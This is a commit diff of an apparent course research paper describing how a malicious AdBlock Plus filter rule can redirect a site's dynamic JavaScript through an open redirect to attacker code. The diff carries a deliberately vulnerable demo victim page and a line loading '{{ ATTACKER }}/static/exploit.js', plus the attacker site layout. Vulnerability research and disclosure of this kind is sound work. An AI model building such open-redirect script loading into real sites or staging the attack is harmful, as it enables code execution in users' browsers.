-		<link rel="stylesheet" href="/static/style.css"></link>
-	</head>
-	<body>
-		<h1>Hello Victim</h1>
-		<hr />
-		<p>
-			Welcome image:
-			<img src="/static/welcome.png">
-		</p>
-		<hr />
-		<p>
-			Advertisement:
-			<span id="ajs" class="border">...</span>
-			<span id="ads_png">
-				<!-- <img src="/static/advertisement.png"> -->
-			</span>
-			<script src="/static/advertisement.js"></script>
-		</p>
-		<hr />
-		<p>
-			Targeted advertisement:
-			<span id="user_info" class="border">...</span>
-		</p>
-		<hr />
-		<p>
-			Static JS:
-			<span id="sjs" class="border">...</span>
-			<script src="/static/static.js"></script>
-		</p>
-		<hr />
-		<p>
-			Dynamic JS:
-			<span id="djs" class="border">...</span>
-			<button id="load">Load</button>
-		</p>
-		<hr />
-		<p>
-			Open <a href="/redirect">redirect</a>:
-			<input type="name" id="redir_url" value="{{ redir_url }}"
-					autocomplete="off"/>
-			<br />
-			<ul>
-				<li class="redir_prefill">/static/dynamic-replace.js</li>
-				<li class="redir_prefill">{{ ATTACKER }}/static/exploit.js</li>
-				<!-- <li class="redir_prefill">/upload/user.js</li> -->
-			</ul>
-		</p>
-		<hr />
-		<p>
-			We will host your input at
-			<a href="/upload/user.js">/upload/user.js</a>!
-			<br />
-			<input name="user" id="user" />
-		</p>
-		<hr />
-		<p>
-			CSP: <button id="csp_apply">Apply</button>
-			<br />
-			{% for enable, line in csp_list %}
-			<input type="checkbox" id="c{{ loop.index0 }}"
-				name="c{{ loop.index0 }}" autocomplete="off"
-				{%- if enable %} checked{% endif %}
-				{%- if loop.last %} class="last"{% endif %}>
-			<label for="c{{ loop.index0 }}"><tt>{{ line }}</tt></label><br>
-			{% endfor %}
-		</p>
-		<script src="/static/script.js"></script>
-	</body>
-</html>
-\end{lstlisting}
-
-Directory of the attacker website
-
-\dirtree{%
-.1 attacker.
-.2 static.
-.3 exploit.js.
-.3 script.js.
-.3 style.css.
-.2 templates.
-.3 index.html.
-.2 attacker.py.
-.2 filter-list.txt.
-}
-
-for the full implementation, please find it at our public repository \href{https://github.com/lxylxy123456/14828}{here}
-
 \section{Peer reviews we have received}
@@
 If possible, we think separating those scripts in the demo may gave the audience a clearer understanding.
-    \item In the "IMPLEMENTATION" section of the draft, it was mentioned that "Adblock Plus version between 3.2 and 3.5.1", yet, the "reproducibility analysis" section mentions that "This attack works on AdBlock Plus 3.2 (released in July 2018) and 3.5.1 (released in April 2019)".
-We think that rephrasing the later sentence to "This attack works on version between AdBlock Plus 3.2 (released in July 2018) and 3.5.1 (released in April 2019)" might be clearer than before.
+    \item In the ``IMPLEMENTATION'' section of the draft, it was mentioned that ``Adblock Plus version between 3.2 and 3.5.1'', yet, the ``reproducibility analysis'' section mentions that ``This attack works on AdBlock Plus 3.2 (released in July 2018) and 3.5.1 (released in April 2019)''.
+We think that rephrasing the later sentence to ``This attack works on version between AdBlock Plus 3.2 (released in July 2018) and 3.5.1 (released in April 2019)'' might be clearer than before.
     \item As mentioned in the first slides of the final presentation, the business model of Eyeo GmbH is an interesting model.

### 2023-05-02 paper/paper.tex
Update figures
Update

@@
 \section{Attack Outline}
-The attack can be schematized in the fo
+The attack can be schematized as follows.
 
-\subsection{Victim website}
+\begin{enumerate}
+    \item Victim website: fetches and loads JavaScript (with XMLHttpRequest or similar technique) and has an open redirect vulnerability.
+    \item Victim user: has enabled a malicious filter list (from a third party or installed by default), and visits the victim's website.
+    \item Attacker: is in control of the malicious filter rule. Archives arbitrary code execution in the client.
+\end{enumerate}
 
-has an open redirect combined with fetching and loading JS code provokes worse problems.
-
-\subsection{Victim user}
-
-install malicious filter list (may be updated automatically), visit victim website.
-
-\subsection{Attacker}
-
-control the malicious filter list.
-
-\subsection{Potential impact}
+See details of the attack in Section \ref{sec:Implementation}.
 
@@
          \centering
-         \includegraphics[width=.9\textwidth]{2-figure}
+         \includegraphics[width=.9\textwidth]{fig-normal}
          \caption{Without the malicious filter, the dynamic JavaScript is loaded on the page.}
@@
          \centering
-         \includegraphics[width=.9\textwidth]{1-figure}
+         \includegraphics[width=.9\textwidth]{fig-attack}
          \caption{With the malicious filter enabled,  AdBlock Plus rewrites the dynamic JavaScript's URL to the open redirect URL, which returns malicious JS code.}
@@
 \end{document}
-
-\begin{table}[htbp]
-\caption{Table Type Styles}
-\begin{center}
-\begin{tabular}{|c|c|c|c|}
-\hline
-\textbf{Table}&\multicolumn{3}{|c|}{\textbf{Table Column Head}} \\
-\cline{2-4} 
-\textbf{Head} & \textbf{\textit{Table column subhead}}& \textbf{\textit{Subhead}}& \textbf{\textit{Subhead}} \\
-\hline
-copy& More table copy$^{\mathrm{a}}$& &  \\
-\hline
-\multicolumn{4}{l}{$^{\mathrm{a}}$Sample of a Table footnote.}
-\end{tabular}
-\label{tab1}
-\end{center}
-\end{table}
-
-\begin{figure}[htbp]
-\centerline{\includegraphics{fig1.png}}
-\caption{Example of a figure caption.}
-\label{fig}
-\end{figure}
